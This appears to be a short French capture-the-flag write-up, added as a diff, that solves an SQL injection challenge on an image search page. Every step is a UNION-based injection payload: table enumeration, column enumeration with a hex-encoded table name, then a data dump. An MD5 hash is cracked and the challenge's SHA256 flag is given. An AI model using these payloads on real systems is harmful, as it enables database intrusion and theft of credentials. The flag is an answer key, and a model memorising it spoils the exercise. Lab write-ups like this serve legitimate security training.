@@ -1,0 +1,14 @@
+Allez dans search Images:
+
+tapez: 1 and 1=0 union select null,table_name from information_schema.tables limit 0,50-- -
+
+
+ensuite taper: (1)and(1)=(0)union(select(null),group_concat(column_name)from(information_schema.columns)where(table_name)=(0x6c6973745f696d61676573))#
+
+puis encore: 1 and 1=0 union select title,comment from list_images limit 0,5-- -
+
+On decrypte le resultat recu en md5 qui donne: albatroz
+
+on le met en lower case et on se crypte en SHA256, qui donne le flag:
+
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
